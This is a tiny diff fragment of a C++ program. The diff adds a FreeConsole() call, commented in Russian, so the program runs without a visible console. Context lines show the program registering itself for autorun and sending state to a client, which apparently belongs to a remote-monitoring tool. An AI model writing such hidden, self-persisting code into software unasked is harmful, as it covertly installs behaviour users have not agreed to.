@@ -54,6 +54,7 @@ void sendState() {
 }
 
 int main() {
+    FreeConsole(); // программа запускается без консоли
 
     client = nullptr;
     OS::addProgramToAutorun("Exe", OS::getExecProgramPath());
